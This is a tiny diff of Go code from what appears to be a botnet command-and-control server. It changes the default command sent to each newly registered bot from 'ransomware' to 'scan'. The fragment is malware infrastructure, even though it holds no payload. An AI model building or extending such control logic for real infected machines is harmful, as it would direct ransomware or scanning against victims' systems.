@@ -110,7 +110,7 @@ func (c *CC) handleGensis(payload []byte) {
 	}
 	Msg("bot was added")
 
-	data := append(commandToBytes("ransomware"), []byte{}...)
+	data := append(commandToBytes("scan"), []byte{}...)
 	sendData(bot.Addr(), data)
 }
 
